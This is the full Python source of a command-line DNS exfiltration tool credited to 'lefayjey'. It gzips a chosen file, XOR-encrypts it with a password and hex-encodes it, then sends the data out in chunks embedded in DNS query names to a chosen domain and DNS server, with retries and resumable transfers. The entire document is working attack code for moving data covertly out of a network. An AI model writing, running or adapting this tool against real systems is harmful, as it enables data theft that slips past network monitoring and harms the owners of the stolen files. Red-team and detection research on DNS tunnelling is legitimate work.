# Title: DNS Exfiltration Tool
# Author: lefayjey

import argparse
import base64
import gzip
import os
import socket
import sys
import time
import json
from datetime import datetime
import hashlib
import random

import dns.resolver
import dns.query
import dns.message

# XOR encryption function
def xor_encrypt(data, password):
    pwd_len = len(password)
    encrypted = bytearray(data)
    for i in range(len(data)):
        encrypted[i] ^= password[i % pwd_len]
    return encrypted

# Data chunking function
def chunk_data(data, chunk_size):
    for i in range(0, len(data), chunk_size):
        yield data[i:i + chunk_size]

# Function to send DNS query with retries
def send_dns_query(dnsquery, dns_server_ip, use_tcp):
    max_retries = 5
    retry_count = 0
    timeout = 3  # seconds
    while retry_count < max_retries:
        try:
            query = dns.message.make_query(dnsquery, dns.rdatatype.A)
            if use_tcp:
                response = dns.query.tcp(query, dns_server_ip, timeout=timeout)
            else:
                response = dns.query.udp(query, dns_server_ip, timeout=timeout)
            return response
        except (dns.exception.Timeout, socket.timeout) as e:
            retry_count += 1
            print(f"[*] Timeout occurred, retrying {retry_count}/{max_retries}...")
            time.sleep(timeout)
    print("[!] Failed to send DNS query after multiple retries.")
    return None

def main():
    parser = argparse.ArgumentParser(description="Exfiltrates a file over DNS by sending XOR-encrypted, base64 encoded chunks as DNS queries.")
    parser.add_argument('-f', '--file', required=True, help='Path to the file you want to exfiltrate.')
    parser.add_argument('-p', '--password', required=True, help='Password to be used in XOR encryption.')
    parser.add_argument('-d', '--domain', default='example.com', help='Domain to use in DNS queries.')
    parser.add_argument('-s', '--dns-server', default='8.8.8.8', help='IP address of the DNS server.')
    parser.add_argument('-t', '--tcp', action='store_true', help='Use TCP instead of UDP.')
    args = parser.parse_args()

    if not os.path.isfile(args.file):
        print("[!] Error: File not found.")
        sys.exit(1)

    file_path = args.file
    password = args.password.encode()
    domain = args.domain
    dns_server_ip = args.dns_server
    use_tcp = args.tcp


    print("       __                     _____ __         ___            __ ")
    print("  ____/ /___  ________  _  __/ __(_) /   _____/ (_)__  ____  / /_")
    print(" / __  / __ \/ ___/ _ \| |/_/ /_/ / /   / ___/ / / _ \/ __ \/ __/")
    print("/ /_/ / / / (__  )  __/>  </ __/ / /   / /__/ / /  __/ / / / /_  ")
    print("\__,_/_/ /_/____/\___/_/|_/_/ /_/_/____\___/_/_/\___/_/ /_/\__/  ")
    print("                                 /_____/                         ")
    print("")
    print("Author: lefayjey")
    print("Version: 1.2.0")
    print("")

    # Get filename from file_path
    filename = os.path.basename(file_path)
    status_file = f"{filename}_transfer_status.log"

    # Calculate MD5 checksum
    md5_hash = hashlib.md5()
    with open(file_path, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            md5_hash.update(chunk)
    md5_checksum = md5_hash.hexdigest()
    print(f"[+] MD5 checksum: [{file_path}: {md5_checksum}]")

    chunk_id = 0
    randnum = random.randint(1, 999999)

    # Check if status file exists
    if os.path.isfile(status_file):
        with open(status_file, 'r', encoding='utf-8-sig') as sf:
            status = json.load(sf)
        print(f"[!] A previous transfer was interrupted: {status}")
        resume = input("[?] Do you want to resume the transfer? (yes/no): ")
        if resume.lower() != "yes":
            os.remove(status_file)
        else:
            chunk_id = int(status['chunk_id'])
            randnum = int(status['randnum'])
            resumed_md5_checksum = status['md5_checksum']
            if resumed_md5_checksum.upper() != md5_checksum.upper():
                print("[!] File has changed. Starting a new transfer.")
                os.remove(status_file)

    print("[*] Encrypting file, please wait...")
    with open(file_path, 'rb') as f:
        file_data = f.read()

    compressed_data = gzip.compress(file_data)
    encrypted_data = xor_encrypt(compressed_data, password)
    encrypted_hex_data = encrypted_data.hex()

    # Maximum DNS query size constraints
    chunk_max_size = 63
    request_max_size = 255

    # Calculate space required for domain name and metadata
    domain_name_length = len(domain) + 3 #including the dots
    encrypted_filename = xor_encrypt(filename.encode(), password).hex()
    metadata_length = len(encrypted_filename) + 23 #including the dots, and the metadata separators, Maximum of 100000 chunks = 20 MB

    # Calculate maximum bytes available for data in each DNS query
    chunk_bytes = request_max_size - metadata_length - domain_name_length

    # Calculate number of chunks
    nb_chunks = len(encrypted_hex_data) // chunk_bytes  + 1

    # Construct metadata
    metadata = f"{encrypted_filename}|{randnum}|{nb_chunks}"

    print(f"[+] Maximum data exfiltrated per DNS request (chunk max size): [{chunk_bytes}] bytes")
    print(f"[+] Number of chunks: [{nb_chunks}]")

    # Calculate start index based on chunk_id
    start_index = chunk_id * chunk_bytes

    print("[*] Sending file, please wait...")

    for chunk_id, chunk in enumerate(chunk_data(encrypted_hex_data[start_index:], chunk_bytes), start=chunk_id):
        # Split chunk into 4 equal chunks
        chunk_length = (len(chunk) + 3) // 4
        chunks = [chunk[i * chunk_length:(i + 1) * chunk_length] for i in range(4)]

        # Construct DNS query
        dnsquery = f"{chunk_id}.{chunks[0]}.{chunks[1]}.{chunks[2]}.{chunks[3]}.{metadata}.{domain}"

        # Update status file
        status = {
            'chunk_id': str(chunk_id),
            'randnum': randnum,
            'file': filename,
            'md5_checksum': md5_checksum,
        }
        with open(status_file, 'w') as sf:
            json.dump(status, sf)

        # Send DNS query using dnspython with retry logic
        response = send_dns_query(dnsquery, dns_server_ip, use_tcp)
        if response is None:
            sys.exit(1)

        print(f"{(100 * (chunk_id + 1) / nb_chunks):.2f}% complete", end='\r')

    # Clean up status file after successful transfer
    if os.path.isfile(status_file):
        os.remove(status_file)

    print("\n[+] Transfer complete!")

if __name__ == '__main__':
    main()
